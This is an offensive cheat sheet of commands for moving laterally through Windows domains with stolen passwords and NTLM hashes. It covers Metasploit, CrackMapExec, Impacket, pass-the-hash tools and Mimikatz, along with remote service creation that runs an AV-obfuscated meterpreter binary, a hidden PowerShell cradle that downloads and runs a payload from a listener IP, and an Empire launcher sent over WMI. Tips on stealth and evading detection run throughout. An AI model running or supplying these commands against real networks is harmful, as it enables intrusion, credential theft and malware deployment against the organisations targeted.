## <----- From Kali -----> ##

#### --- Spray and Pray--- ####

```
msf > use auxiliary/scanner/smb/smb_login  
msf auxiliary(smb_login) > set SMBDomain CSCOU  
SMBDOMAIN => CSCOU  
msf auxiliary(smb_login) > set SMBUser jarrieta  
SMBUser => jarrieta  
msf auxiliary(smb_login) > set SMBPass nastyCutt3r  
SMBPass => nastyCutt3r  
msf auxiliary(smb_login) > services -p 445 -R  
msf auxiliary(smb_login) > run
```
*Note: Any succesfull logins will be stored in the msf database. View them with:* ```creds```

#### --- CrackMapExec (CME) --- ####

Testing credentials and launching attacks on a large number of hosts

```cme smb $ip_or_range -d $domain -u $user -p $password```


#### --- Metasploit psexec --- ####

```use exploit windows/smb/psexec```

NOTE: ```auxiliary/admin/smb/psexec_command``` if you want to just run a single command. This module can also take a range of RHOSTS


#### --- Winexe --- ####

An old *nix tool to execute Windows commands remotely, built in to Kali.
You can execute a single command or drop right into a command prompt:

```winexe -U $domain/$user%$password //$host_ip cmd.exe```

Or

```winexe -U Administrator%password123 //192.168.1.11 "cmd"```

### Impacket ###

#### --- psexec.py --- ####

NOTE: Use clone in ```/opt```

```python psexec.py $domain/$user:$password@ip_address```

https://github.com/byt3bl33d3r/pth-toolkit

> "pth" suite contains a bunch of programs that have been patched to support authenticating with hashes:
> They're the same, we're just using a Hash instead of a plaintext password now.

```pth-net```

```pth-rpcclient```

```pth-smbclient```  

```pth-smbget```  

```pth-sqsh```  

```pth-winexe```  

```pth-wmic```  

```pth-wmis```


#### --- smbexec --- ####

This one is a bit "stealthier" as it doesn't drop a binary on the target system.
Commands and output are asynchronous

```python smbexec.py $domain/$user:$password@ip_address```


#### --- wmiexec.py --- ####

Under the hood this one uses Windows Management Instrumentation (WMI) to launch a semi-interactive shell.

```python wmiexec.py $domain/$user:$password@ip_address```


#### --- CrackMapExec --- ####

You can also use CrackMapExec to execute commands on hosts by passing it the "-x" parameter.
Since it's built on Impacket's libraries, it's basically doing the exact same thing as wmiexec.py.
But let's you do it across a range of IPs

```python crackmapexec.py $ip_address -d $domain -u $user -p $pass -x $cmd```


#### --- Remote Desktop/rdp_check --- ####

```python rdp_check.py $domain/$user:$pass@$ip_address```

NOTE: Use these to get code execution and elevate into Empire/MSF


## <----- From Windows -----> ##

NOTE: *Tools mentioned previously (psexec, wmiexec, etc) are essentially re-implementations of core Windows functionality.*

#### Testing Credentials and Exploring the Domain ####

#### --- SMB Login --- ####

An easy way to test credentials is to try to initiate an SMB connection to the machine.
This is essentially what Metasploit's module does. 

NOTE: *$user and $pass are considered known values at this point*

```net use \\$target /user:$domain\$user $pass```

```net use z: \\$target\$VOL```

```
IF access_is_ok
  'The command completed successfully'
ELSE
  'Access is denied'
FI
```

##### Check which connections we have open #####

```net use```

NOTE: Easily detected if sysadmin runs ```net session```.

##### Terminate all sessions #####

```net use /delete *```

##### Problem #####

We can't use all the net commands and other Windows tools by passing a username and password.
For example, net view doesn't have a ```/user``` option and instead defaults to using your local logon.
But we can bypass that limitation.


#### --- Using 'runas' to get Kerberos auth --- ####

The Windows runas command let's us execute commands in the context of another user.
When used with the ```/netonly``` option, we can authenticate as a domain user.
Even though we're not on a domain joined machine.

We can launch an interactive command prompt by running "cmd.exe" with runas.
The beauty of this technique is that our LogonId changes, and we can actually start using Kerberos auth on the domain.
Note how the ```whoami``` output is the same but our LogonId changes in the new command prompt after doing a ```runas```.

```whoami```

```klist```

```runas /netonly /user:$domain\$user "cmd.exe"```

NOTE: *In this new command prompt, we don't need to run the net use command to open connections with specified credentials.
We can just use normal commands the Windows will use our LogonId with Kerberos authentication:*

In ```runas``` terminal/prompt:

```net view \\target /all```

```klist```


#### --- PSExec --- ####

*PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. It's a standalone binary that's included in the Sysinternals suite.
You can pass credentials to it and remotely execute commands or drop into an interactive command prompt*


NOTE: *PsExec is remotely starting a service on the target machine (called "PSEXECSVC") > 'C:\Windows\PSEXECSVC.exe'. That directory is actually the ADMIN$ share over SMB. So PsExec performs a few steps to get you a shell...*

```
1. Copy a binary to the ADMIN$ share over SMB
2. Create a service on the remote maching pointing to the binary
3. Remotely start the service
4. When exited, stop the service and delete the binary
```

##### Manually PsExec'ing #####

*Assume we have a payload executable we generated with msfvenom and obfuscated with Veil (so AV doesn't flag it)*


###### 1. Copy the binary ######

From origin command prompt, simply copy the binary to the ADMIN$.

```copy evil.exe \\target\$share```

Really though, it could be copied and hidden anywhere on the filesystem.

###### 2. Create a service ######

The Windows [sc command](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490995(v=technet.10)?redirectedfrom=MSDN) is used to query, create, delete, etc Windows services and can be used remotely.

From command prompt, remotely create a service called "meterpreter" that points to uploaded binary:

```sc \\target create meterpreter binPath= "c:\Windows\evil.exe"```

###### 3. Start the Service ######

Start the service and execute the binary.
Note: *When the service starts it will "time-out" and generate an error. That's because our meterpreter binary isn't an actual service binary and won't return the expected response code. That's fine because we just need it to execute once to fire.*

```sc \\target start meterpreter```

Check listener

###### 4. Clean up our mess ######
Migrate out of the evil.exe process and into a more permanent one.
Then we need to delete the binary and stop/delete the remote service.

```del \\target\share\evil.exe```

###### -- NOTES -- ######

By default, services are created and ran as SYSTEM.

When we created the service, we didn't specify a username for it to run as so it defaulted to SYSTEM.

If we really wanted to run the service with different credentials, we could have specified when we created it.

Conversely, we could have specified the ```-s``` option with PsExec to get a SYSTEM shell too.

##### Executing Commands via Services #####

It is possible to execute commands directly from service binPaths instead of needing a binary.

#### --- MSF: 'web_delivery' --- ####

###### PS Payload ######

```powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n'); ```

###### Windows Attack Box ######

Create a remote service ("metpsh") and set the binPath to execute cmd.exe with our payload:

```sc \\target create metpsh binPath= "%COMSPEC% /Q /c $ps_payload"```

###### Start It ######

```sc \\target start metpsh```


## <----- Using Credentials to Own Windows Boxes - (WMI and WinRM) -----> ##

NOTE: *Working from a Windows attack box utilizing the Windows command line and PowerShell to execute commands via Windows Management Instrumentation (WMI) and Windows Remote Management (WinRM).*

### WMI ###

NOTE: *Windows Management Instrumentation (WMI) is the infrastructure for management data and operations on Windows-based operating systems. Allows remote querying and administration of Windows devices. Like SNMP for Windows infrastructure. From an attacker's perspective, WMI can be very valuable in enumerating sensitive information about a system or the domain.*

Drop to interactive prompt:

```wmic```

Help

```/?```

Note: *When working from the command prompt, it's useful to append "list brief" or "list full" for easy to read output. You can also append "/format:list" in the command line*

Examples...

```wmic computerystem list full /format:list```

```wmic process list /format:list```

```wmic ntdomain list /format:list```  

```wmic useraccount list /format:list```  

```wmic group list /format:list```  

```wmic sysaccount list /format:list```  

#### Remote WMI Querying ####

NOTE: *wmic can be used to query remote systems as well. The command takes the switches /node and /user to specify which host to query and what credentials to authenticate with.*

```wmic```

```node:"$pc_name.$domain" /user:$domain\$user computersystem list brief /format:list```

NOTE: *You can also interact with classes directly with the 'path' option. For example, here's a very stealthy way to discover local admins on a remote machine (note that domain is the computer name):*


```wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")```

Note: *Running wmic without /user will default to current user*

See who is logged on to a machine (for when you're hunting admins):

```wmic /node:ordws01 path win32_loggedonuser get antecedent  ```

Read nodes from a text file and execute the command on all of them. If you have a text file of workstations:

```wmic /node:@workstations.txt path win32_loggedonuser get antecedent ```

NOTE:  *See Nishang and Powersploit for weaponised examples*

#### WMI Process Create ####

Code execution!!

```wmic path win32_process_call create "calc.exe"```

NOTE: *Command returns the ProcessID and the ReturnValue (0 meaning no errors)*

NOTE: *By specifying /node it's incredibly easy to remotely create processes and execute commands.*

##### Launching Empire ######

###### 1. Generate the command string to execute using the "launcher" stager in Empire: ######

```powershell.exe -NoP -sta -NonI -W Hidden -Enc JABXAEMAPQBOAEUAVwAtAE8AQgBKAGUAQw...truncated...```

###### 2. From Windows remotely create a process over WMI to execute that string: ######

```wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**" ```

#### WinRM ####

NOTE: *Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilizing WMI, so you can think of it as an HTTP based API for WMI.*

The easiest way to detect whether WinRM is available is by seeing if the port is opened. WinRM will listen on one of two ports:

1. 5985/tcp (HTTP)

2. 5986/tcp (HTTPS)

##### Initiating WinRM Session. #####

###### 1. Configure Attack Machine ######

NOTE: *Configure our attack machine to work with WinRM as well. We need to enable it and add any "victims" as trusted hosts. From an elevated PowerShell prompt, run the following two commands:*

```Enable-PSRemoting -Force  ```

```Set-Item wsman:\localhost\client\trustedhosts *  ```

NOTE: *This adds a wildcard to the trustedhosts setting. Be wary of what that entails. Note: I also had to change the network type on my attack machine from "Public" to "Work" network. YMMV*

###### 2. test whether target machine is configured for WinRM ######

```test-WSMan $computername```

###### 3. Execute command on target over WinRM ######

```Invoke-Command -Computer ordws01 -ScriptBlock {ipconfig /all} -credential CSCOU\jarrieta ```

OR...

Drop into an interactive PS sessions:

```Enter-PSSession -Computer $pcname -credential $domain\$user```

##### Force WinRM Open #####

NOTE: Not recommended...

```PS C:\tools\SysinternalsSuite> .\PsExec.exe \\$pcName -u $domain\$user -p nastyCutt3r -h -d powershell.exe "enable-psremoting force"```


## <----- Practical Usage of NTLM Hashes (PTH) -----> ##

##### Test Logins with Hashes #####

###### CME ######

```cme smb 192.168.0/24 -u $user -H $nt_or_ntlm```

###### MSF smb_login ######

>> Metasploit's smb_login can also be used with hashes to test credentials and see if a user is an Administrator. Metasploit requires the full NTLM hash, however, so you have to add the "blank" LM portion to the beginning:

```aad3b435b51404eeaad3b435b51404ee == empty hash```

```set smbpass aad3b435b51404eeaad3b435b51404ee:$knownHash```

##### pth-toolkit and Impacket #####

https://github.com/byt3bl33d3r/pth-toolkit

> "pth" suite contains a bunch of programs that have been patched to support authenticating with hashes:
> They're the same, we're just using a Hash instead of a plaintext password now.

NOTE: *The pth suite uses the format DOMAIN/user%hash:*

Example: ```aad3b435b51404eeaad3b435b51404ee:$knownHash```

```pth-net```  

```pth-rpcclient```  

```pth-smbclient```  

```pth-smbget```  

```pth-sqsh```  

```pth-winexe```  

```pth-wmic```  

```pth-wmis```

##### pth-winexe #####

```pth-winexe -U $domain\$useraad3b435b51404eeaad3b435b51404ee:$knownHash //$target cmd.exe```

##### Impacket #####

NOTE: ```All the Impacket examples support hashes. If you don't want to include the blank LM portion, just prepend a leading colon:```

```python wmiexec.py -hashes :$knowHash $user@$target```

#### Using Hashes with Windows ####

https://github.com/maaaaz/impacket-examples-windows

Compiled for Windows:

```.\wmiexec.exe -hashes :$knowHash $user@$target```

#### PTH with Mimikatz ####

###### 1. Start mimikatz prompt ######

```sekurlsa::pth /user:$user /domain:$domain /ntlm:$ntlmHash```
